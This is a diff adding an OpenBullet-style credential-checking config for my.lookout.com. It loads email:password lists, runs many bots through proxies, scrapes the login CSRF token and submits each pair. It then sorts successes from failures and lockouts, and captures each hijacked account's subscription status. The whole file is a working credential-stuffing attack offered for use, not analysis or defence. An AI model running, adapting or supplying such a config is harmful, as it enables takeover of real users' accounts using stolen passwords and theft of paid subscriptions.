@@ -1,0 +1,90 @@
+[SETTINGS]
+{
+  "Name": "Lookout",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-08-18T12:41:43.6473573+02:00",
+  "AdditionalInfo": "",
+  "Author": "Itamai",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://my.lookout.com/user/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Encoding: *" 
+  HEADER "Accept-Language: *" 
+  HEADER "Cookie: _ga=GA1.2.2023074602.1565908791; _gid=GA1.2.1256939098.1565908791; _dc_gtm_UA-6252142-42=1; _biz_uid=b5afceb56b184befd21ac23d13e2f5b1; _biz_sid=8299a8; _biz_nA=1; _biz_pendingA=%5B%5D; _biz_flagsA=%7B%22Version%22%3A1%2C%22XDomain%22%3A%221%22%7D; _flexd_session=da316d5146c2da2aa5e12d0f7e89f769; _ga=GA1.3.2023074602.1565908791; _gid=GA1.3.1256939098.1565908791; _gat_UA-6252142-38=1; __utma=3077676.2023074602.1565908791.1565908798.1565908798.1; __utmc=3077676; __utmz=3077676.1565908798.1.1.utmcsr=lookout.com|utmccn=(referral)|utmcmd=referral|utmcct=/; __utmt=1; __utmb=3077676.1.10.1565908798" 
+  HEADER "DNT: 1" 
+  HEADER "Host: my.lookout.com" 
+  HEADER "Origin: https://my.lookout.com" 
+  HEADER "Referer: https://my.lookout.com/user/login" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+
+PARSE "<SOURCE>" LR "hidden\" value=\"" "\"" EncodeOutput=TRUE -> VAR "token" 
+
+REQUEST POST "https://my.lookout.com/user/login" AutoRedirect=FALSE 
+  CONTENT "authenticity_token=<token>&redirect=&cwa=https%3A%2F%2Fpersonal.lookout.com&user%5Bemail%5D=<USER>&user%5Bpassword%5D=<PASS>&login=Log+In" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Encoding: *" 
+  HEADER "Accept-Language: *" 
+  HEADER "DNT: 1" 
+  HEADER "Host: my.lookout.com" 
+  HEADER "Origin: https://my.lookout.com" 
+  HEADER "Referer: https://my.lookout.com/user/login" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Password combination is incorrect" 
+    KEY "You tried to login too many times with the wrong credentials. Please try again in one hour" 
+    KEY "<SOURCE>" DoesNotContain "You are being <a href=\"https://personal.lookout.com\">redirected" 
+  KEYCHAIN Success OR 
+    KEY "You are being <a href=\"https://personal.lookout.com\">redirected" 
+
+REQUEST GET "https://my.lookout.com/api/v1/web/user" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "\"id\":" ",\"" -> VAR "id" 
+
+REQUEST GET "https://my.lookout.com/account/details?id=<id>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "account_state_name\":\"" "\"" -> CAP "Subscription" 
+
